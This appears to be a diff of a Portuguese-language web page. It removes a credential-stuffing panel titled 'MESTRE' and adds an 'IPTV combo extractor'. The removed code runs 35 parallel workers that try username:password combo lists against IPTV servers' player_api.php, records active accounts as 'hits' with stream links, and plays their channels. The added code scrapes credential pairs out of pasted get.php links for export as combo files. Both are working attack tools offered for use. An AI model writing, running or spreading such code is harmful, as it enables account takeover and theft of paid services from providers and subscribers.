@@ -1,303 +1,128 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🆃🅷🅰️🆈🆂⭕️〽️ MESTRE 💎</title>
-    <style>
-        :root {
-            --matrix-green: #39FF14;
-            --matrix-green-dark: #008F11;
-            --glass-bg: rgba(10, 25, 10, 0.7);
-            --border-color: rgba(57, 255, 20, 0.3);
-            --bg-dark: #000;
-        }
-
-        @keyframes pulse-green { 0% { text-shadow: 0 0 5px var(--matrix-green); } 50% { text-shadow: 0 0 20px var(--matrix-green); } 100% { text-shadow: 0 0 5px var(--matrix-green); } }
-        @keyframes ripple { to { transform: scale(4); opacity: 0; } }
-
-        body { margin: 0; padding: 10px; background-color: var(--bg-dark); color: var(--matrix-green); font-family: 'Courier New', monospace; overflow-x: hidden; }
-        #matrix-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; }
-        .container { width: 100%; max-width: 420px; margin: auto; background: var(--glass-bg); backdrop-filter: blur(5px); -webkit-backdrop-filter: blur(5px); border-radius: 15px; border: 1px solid var(--border-color); padding: 15px; box-shadow: 0 0 25px rgba(57, 255, 20, 0.2); }
-        .header { background: linear-gradient(45deg, var(--matrix-green-dark), #000); color: var(--matrix-green); padding: 10px; text-align: center; font-weight: bold; margin-bottom: 15px; border-radius: 10px 10px 0 0; animation: pulse-green 3s infinite; }
-        
-        .input-group { display: grid; grid-template-columns: 1fr 2fr; align-items: center; margin-bottom: 10px; gap: 10px; }
-        .input-group label { font-size: 14px; color: var(--matrix-green); animation: pulse-green 5s infinite; }
-        .input-group input, .input-group textarea { background-color: rgba(0,0,0,0.5); border: 1px solid var(--border-color); color: var(--matrix-green); padding: 8px; font-family: 'Courier New', monospace; border-radius: 5px; }
-        textarea#servidores { height: 60px; resize: vertical; } /* Estilo para a área de texto */
-        
-        .button, .tab { position: relative; overflow: hidden; transition: all 0.2s ease; background-color: transparent; border: 1px solid var(--border-color); color: var(--matrix-green); }
-        .button:hover, .tab:hover { background-color: var(--matrix-green); color: #000; box-shadow: 0 0 20px var(--matrix-green); transform: translateY(-2px); }
-        .ripple { width: 20px; height: 20px; position: absolute; background: rgba(57, 255, 20, 0.7); border-radius: 50%; transform: scale(0); animation: ripple 0.6s linear; }
-        
-        .buttons { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-top: 15px; }
-        .button { padding: 10px 5px; cursor: pointer; border-radius: 5px; text-align: center; font-weight: bold; font-size: 12px; }
-        
-        .tabs { display: flex; margin-top: 15px; border-radius: 5px; overflow: hidden; }
-        .tab { flex: 1; padding: 8px; text-align: center; font-size: 12px; cursor: pointer; }
-        .tab.active { background-color: var(--matrix-green); color: #000; }
-
-        .logs-container { margin-top: 5px; }
-        .log-pane { background-color: rgba(0,0,0,0.5); border: 1px solid var(--border-color); height: 30vh; overflow-y: auto; padding: 10px; border-radius: 5px; }
-        .log-hit { color: var(--matrix-green); font-weight: bold; animation: pulse-green 2s infinite; }
-        .log-fail { color: var(--matrix-green-dark); opacity: 0.7; }
-        .log-error { color: #FF9800; }
-
-        #player-container { display: none; margin-top: 15px; padding: 10px; background: var(--glass-bg); border-radius: 10px; border: 1px solid var(--border-color); }
-        #player-container h2 { text-align: center; color: var(--matrix-green); margin-top: 0; animation: pulse-green 3s infinite; }
-        #video-player { width: 100%; border-radius: 5px; border: 1px solid var(--border-color); }
-        #channel-grid { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 10px; max-height: 200px; overflow-y: auto; justify-content: center; }
-        .channel-button { background: var(--matrix-green-dark); color: #fff; border: 1px solid var(--border-color); padding: 8px 12px; border-radius: 5px; cursor: pointer; position: relative; overflow: hidden; }
-        
-        .status-bar { display: grid; grid-template-columns: repeat(4, 1fr); background-color: rgba(0,0,0,0.5); padding: 8px; font-size: 12px; gap: 10px; text-align: center; margin-top: 10px; color: var(--matrix-green); border-radius: 5px; border: 1px solid var(--border-color); }
-        #hitsContent pre { color: var(--matrix-green); margin: 0 0 15px 0; font-size: 12px; }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Extrator de Combos IPTV</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      font-family: Arial, sans-serif;
+      background: #f9f9f9;
+      padding: 20px;
+      margin: 0;
+    }
+    h2, h3 { text-align: center; }
+    textarea, .resultado {
+      width: 100%;
+      font-size: 16px;
+      padding: 10px;
+      margin-top: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      resize: vertical;
+    }
+    .resultado {
+      min-height: 200px;
+    }
+    button {
+      padding: 12px 18px;
+      font-size: 16px;
+      margin: 10px 5px 0 0;
+      border: none;
+      background: #3b82f6;
+      color: white;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #2563eb;
+    }
+    .info {
+      margin-top: 10px;
+      font-weight: bold;
+    }
+    @media (max-width: 600px) {
+      button {
+        width: 100%;
+        margin-top: 10px;
+      }
+    }
+  </style>
 </head>
 <body>
-    <canvas id="matrix-canvas"></canvas>
-    <audio id="hit-sound" src="data:audio/mpeg;base64,UklGRigGAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQQGAACAgIAgISIiGCgmMioqKSsrLC0uLzAzNDY2Nzc4OTo7Ozw9Pj9AQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVpbXF1eX2BhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ent8fX5/gIGCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXmJmam5ydnp+goaKjpKWmp6ipqqusra6vsLGys7S1tre4ubq7vL2+v8DBwsPExcbHyMnKy8zNzs/Q0dLT1NXW19jZ2tvc3d7f4OHi4+Tl5ufo6err7O3u7/Dx8vP09fb3+Pn6+/z9/v8AAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHwAhIiMkJSYnKCkqKywtLi8wMzQ1Njc4OTo7PD0+P0BBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWltcXV5fYGFiY2RlZmdoaWprbG1ub3Bxcv8A/Pz8/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+zv7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7+/v7u/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f39/f3p6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6enp6ePj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6Li4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCw"></audio>
 
-    <div id="main-content" class="container">
-        <div class="header glow">🆃🅷🅰️🆈🆂⭕️〽️ MESTRE</div>
-        
-        <div class="input-group">
-            <label for="nick" class="glow">Nickname:</label>
-            <input type="text" id="nick" value="𝕥ꫝꪖꪗડꪮꪀ">
-        </div>
-        <div class="input-group">
-            <label for="servidores" class="glow">Lista de<br>Servidores:</label>
-            <textarea id="servidores" rows="3" placeholder="http://servidor1.com:8080&#10;http://servidor2.net:80&#10;...um por linha"></textarea>
-        </div>
-        <div class="input-group">
-            <label for="combo" class="glow">Combo:</label>
-            <input type="file" id="combo" accept=".txt">
-        </div>
+  <h2>📡 Extrator de Combos IPTV</h2>
 
-        <div class="buttons">
-            <a href="#" class="button btn-start">START ATTACK</a>
-            <a href="#" class="button btn-copy">COPY HITS</a>
-            <a href="#" class="button btn-quit">QUIT</a>
-        </div>
+  <label for="entrada">Cole o conteúdo aqui:</label>
+  <textarea id="entrada" rows="6" placeholder="Cole links IPTV aqui..."></textarea>
 
-        <div class="tabs">
-            <div class="tab active" data-tab="activity">SCAN ACTIVITY</div>
-            <div class="tab" data-tab="hits">HITS RESULTS</div>
-        </div>
+  <button onclick="colarClipboard()">📋 Colar</button>
+  <button onclick="extrairCombos()">➕ Extrair</button>
+  <button onclick="baixarTxt()">📥 Download .txt</button>
 
-        <div class="logs-container">
-            <div id="activityContent" class="log-pane"></div>
-            <div id="hitsContent" class="log-pane" style="display:none;"></div>
-        </div>
-        
-        <div id="player-container">
-            <h2 class="glow">▶ PLAYER DE TESTE</h2>
-            <video id="video-player" controls></video>
-            <button class="button" id="btn-load-channels" style="width: 100%; margin-top: 10px; background-color: var(--matrix-green); color: #000;">🌟 Carregar Canais do Hit</button>
-            <div id="channel-grid"></div>
-        </div>
+  <div class="info">🔢 Total de combos únicos: <span id="contador">0</span></div>
 
-        <div class="status-bar">
-            <span id="statusText">Status: Parado</span>
-            <span id="progressStatus">Progresso: 0%</span>
-            <span>Nick: <span id="nickDisplay">𝕥ꫝꪖꪗડꪮꪀ</span></span>
-            <span>Hits: <span id="hitsCount">0</span></span>
-        </div>
-    </div>
-    
-    <script src="https://cdn.jsdelivr.net/npm/hls.js@latest"></script>
-    <script>
-        // --- SCRIPT DO FUNDO MATRIX ---
-        const canvas = document.getElementById('matrix-canvas');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        const katakana = 'アァカサタナハマヤャラワガザダバパイィキシチニミリウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン01';
-        const fontSize = 16;
-        const columns = canvas.width / fontSize;
-        const drops = Array.from({ length: columns }).fill(1);
-        
-        function drawMatrix() {
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = getComputedStyle(document.documentElement).getPropertyValue('--matrix-green');
-            ctx.font = fontSize + 'px monospace';
-            for (let i = 0; i < drops.length; i++) {
-                const text = katakana.charAt(Math.floor(Math.random() * katakana.length));
-                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-                drops[i]++;
-            }
-        }
-        let matrixInterval = setInterval(drawMatrix, 33);
+  <h3>✅ Combos extraídos (editáveis):</h3>
+  <textarea class="resultado" id="resultado" placeholder="Os combos aparecerão aqui..." oninput="removerRepetidos()"></textarea>
 
-        // --- SCRIPT DO PAINEL ---
-        let hitCount = 0, scanParado = true, playerServer, playerUser, playerPass;
-        const hitSound = document.getElementById('hit-sound');
+  <script>
+    let todosCombos = new Set();
 
-        function createRipple(event) {
-            const button = event.currentTarget;
-            const circle = document.createElement("span");
-            const diameter = Math.max(button.clientWidth, button.clientHeight);
-            circle.style.width = circle.style.height = `${diameter}px`;
-            circle.style.left = `${event.clientX - button.getBoundingClientRect().left - diameter / 2}px`;
-            circle.style.top = `${event.clientY - button.getBoundingClientRect().top - diameter / 2}px`;
-            circle.classList.add("ripple");
-            button.querySelector(".ripple")?.remove();
-            button.appendChild(circle);
-        }
+    function colarClipboard() {
+      navigator.clipboard.readText().then(texto => {
+        document.getElementById("entrada").value = texto;
+      }).catch(err => {
+        alert("Erro ao acessar a área de transferência: " + err);
+      });
+    }
 
-        function formatarData(ts) {
-            if (!ts) return "N/A";
-            const d = new Date(ts * 1000);
-            return `${d.getDate().toString().padStart(2, '0')}/${(d.getMonth() + 1).toString().padStart(2, '0')}/${d.getFullYear()}`;
-        }
-        function updateNick() { document.getElementById('nickDisplay').textContent = document.getElementById('nick').value; }
-        setInterval(updateNick, 1000);
-        function quit() { alert('Saindo...'); }
-        function showTab(tabName) {
-            document.querySelectorAll('.log-pane').forEach(p => p.style.display = 'none');
-            document.getElementById(tabName === 'activity' ? 'activityContent' : 'hitsContent').style.display = 'block';
-            document.querySelectorAll('.tab').forEach(t => t.classList.toggle('active', t.dataset.tab === tabName));
-        }
-        function copiarHits() {
-            const text = document.getElementById('hitsContent').innerText;
-            if (!text.trim()) return alert("Nenhum hit para copiar.");
-            navigator.clipboard.writeText(text).then(() => alert("Hits copiados!"));
-        }
+    function extrairCombos() {
+      const texto = document.getElementById("entrada").value;
+      const resultadoArea = document.getElementById("resultado");
 
-        let hls;
-        function playStream(url) {
-            const video = document.getElementById('video-player');
-            if (Hls.isSupported()) {
-                if (hls) hls.destroy();
-                hls = new Hls();
-                hls.loadSource(url);
-                hls.attachMedia(video);
-                hls.on(Hls.Events.MANIFEST_PARSED, () => video.play());
-            }
-        }
+      // Limpa o campo de entrada
+      document.getElementById("entrada").value = "";
 
-        async function loadChannels() {
-            const grid = document.getElementById('channel-grid');
-            grid.innerHTML = '<p>Carregando...</p>';
-            if (!playerServer) return grid.innerHTML = '<p>Nenhum hit encontrado.</p>';
-            try {
-                const res = await fetch(`${playerServer}/player_api.php?username=${playerUser}&password=${playerPass}&action=get_live_streams`);
-                const channels = await res.json();
-                grid.innerHTML = '';
-                if (!Array.isArray(channels) || channels.length === 0) return grid.innerHTML = '<p>Nenhum canal ao vivo encontrado.</p>';
-                channels.slice(0, 100).forEach(ch => {
-                    const btn = document.createElement('button');
-                    btn.className = 'button channel-button';
-                    btn.textContent = ch.name;
-                    btn.onclick = () => playStream(`${playerServer}/live/${playerUser}/${playerPass}/${ch.stream_id}.m3u8`);
-                    btn.addEventListener('click', createRipple);
-                    grid.appendChild(btn);
-                });
-            } catch (e) {
-                grid.innerHTML = '<p>Erro ao carregar os canais.</p>';
-            }
-        }
+      const padraoLink = /get\.php\?username=([\w\d]+)&password=([\w\d]+)/gi;
+      let match;
 
-        async function startAttack() {
-            if (!scanParado) {
-                scanParado = true;
-                document.getElementById('activityContent').innerHTML += "<div class='log-error'>🛑 Parando...</div>";
-                return;
-            }
-            scanParado = false;
-            const servidores = document.getElementById("servidores").value.trim().split('\n').filter(s => s.trim() !== "");
-            const comboFile = document.getElementById("combo").files[0];
-            const numBots = 35; // Mais rápido ainda
+      while ((match = padraoLink.exec(texto)) !== null) {
+        const usuario = match[1];
+        const senha = match[2];
+        todosCombos.add(`${usuario}:${senha}`);
+      }
 
-            if (servidores.length === 0 || !comboFile) {
-                scanParado = true;
-                return alert("Preencha a lista de servidores e selecione um combo!");
-            }
-            
-            document.getElementById('activityContent').innerHTML = '';
-            document.getElementById('hitsContent').innerHTML = '';
-            document.getElementById('player-container').style.display = 'none';
-            hitCount = 0;
-            document.getElementById('hitsCount').textContent = 0;
-            playerServer = null;
+      resultadoArea.value = Array.from(todosCombos).join("\n");
+      atualizarContador();
+    }
 
-            const activityContent = document.getElementById("activityContent");
-            const hitsContent = document.getElementById("hitsContent");
-            const startButton = document.querySelector('.btn-start');
-            
-            activityContent.innerHTML = `<div style="color: var(--matrix-green)">Iniciando ${numBots} bots em ${servidores.length} servidor(es)...</div>`;
-            document.getElementById('statusText').textContent = 'Status: Rodando';
-            startButton.textContent = 'STOP ATTACK';
+    function removerRepetidos() {
+      const resultadoArea = document.getElementById("resultado");
+      const linhas = resultadoArea.value.split("\n").map(l => l.trim()).filter(l => l && l.includes(":") && !/^\d{1,2}:\d{2}$/.test(l));
+      const unicos = Array.from(new Set(linhas));
+      resultadoArea.value = unicos.join("\n");
+      todosCombos = new Set(unicos);
+      atualizarContador();
+    }
 
-            const texto = await comboFile.text();
-            const comboLinhas = texto.split(/\r?\n/).filter(l => l.includes(":"));
-            
-            const tasks = [];
-            for (const combo of comboLinhas) {
-                for (const servidor of servidores) {
-                    tasks.push({ combo, servidor });
-                }
-            }
-            
-            const totalTasks = tasks.length;
-            let processedCount = 0;
-            document.getElementById('progressStatus').textContent = `Progresso: 0%`;
+    function atualizarContador() {
+      const resultado = document.getElementById("resultado").value;
+      const linhasValidas = resultado.split("\n").filter(l => l.includes(":") && !/^\d{1,2}:\d{2}$/.test(l.trim()));
+      document.getElementById("contador").textContent = linhasValidas.length;
+    }
 
-            const worker = async () => {
-                while (tasks.length > 0 && !scanParado) {
-                    const { combo, servidor } = tasks.shift();
-                    const [user, pass] = combo.trim().split(":", 2);
-                    if (!user || !pass) continue;
-                    
-                    const servidorLimpo = servidor.trim().replace(/\/$/, "");
-                    let hostname;
-                    try { hostname = new URL(servidorLimpo).hostname; } catch (e) { hostname = servidorLimpo; }
+    function baixarTxt() {
+      const conteudo = document.getElementById("resultado").value;
+      const blob = new Blob([conteudo], { type: "text/plain" });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement("a");
+      a.href = url;
+      a.download = "combos_iptv.txt";
+      a.click();
+      URL.revokeObjectURL(url);
+    }
+  </script>
 
-                    try {
-                        const res = await fetch(`${servidorLimpo}/player_api.php?username=${user}&password=${pass}`);
-                        const data = await res.json();
-                        if (data.user_info?.status?.toLowerCase() === "active") {
-                            activityContent.innerHTML += `<div class="log-hit glow">[HIT] (${hostname}) ${user}:${pass}</div>`;
-                            hitSound.play();
-                            const info = data.user_info;
-                            const resultadoTexto = `♦️▂✬ℳ3𝓤🎩ડᥴꪖꪀꪀꫀ𝕣✬▂♦️\n☢️🌬Servidor: ${servidorLimpo}\n☢️🌬Usuário: ${user}\n☢️🌬Senha: ${pass}\n☢️🌬Expira em: ${formatarData(info.exp_date)}\n⊰---------------------------------⊱\n☢️🌬M3U: ${servidorLimpo}/get.php?username=${user}&password=${pass}&type=m3u\n⊰---------------------------------⊱\n☢️🌬M3U8: ${servidorLimpo}/get.php?username=${user}&password=${pass}&type=m3u8\n⊰---------------------------------⊱\n☢️🌬EPG: ${servidorLimpo}/xmltv.php?username=${user}&password=${pass}`;
-                            const pre = document.createElement('pre');
-                            pre.textContent = resultadoTexto;
-                            hitsContent.appendChild(pre);
-                            hitCount++;
-                            document.getElementById('hitsCount').textContent = hitCount;
-                            if (hitCount === 1) {
-                                playerServer = servidorLimpo;
-                                playerUser = user;
-                                playerPass = pass;
-                                document.getElementById('player-container').style.display = 'block';
-                            }
-                        } else {
-                            activityContent.innerHTML += `<div class="log-fail">[FALHA] (${hostname}) ${user}:${pass}</div>`;
-                        }
-                    } catch (e) {}
-                    processedCount++;
-                    const percentage = totalTasks > 0 ? Math.floor((processedCount / totalTasks) * 100) : 0;
-                    document.getElementById('progressStatus').textContent = `Progresso: ${percentage}%`;
-                    activityContent.scrollTop = activityContent.scrollHeight;
-                }
-            };
-            await Promise.all(Array.from({ length: numBots }, worker));
-            
-            activityContent.innerHTML += `<div class="log-hit">✅ Verificação Finalizada.</div>`;
-            document.getElementById('statusText').textContent = 'Status: Parado';
-            startButton.textContent = 'START ATTACK';
-            scanParado = true;
-        }
-
-        document.addEventListener('DOMContentLoaded', () => {
-            document.querySelector('.btn-start').addEventListener('click', startAttack);
-            document.querySelector('.btn-copy').addEventListener('click', copiarHits);
-            document.querySelector('.btn-quit').addEventListener('click', quit);
-            document.getElementById('btn-load-channels').addEventListener('click', loadChannels);
-            document.querySelectorAll('.tab').forEach(t => t.addEventListener('click', () => showTab(t.dataset.tab)));
-            document.querySelectorAll('.button, .tab').forEach(b => b.addEventListener('click', createRipple));
-        });
-    </script>
 </body>
 </html>
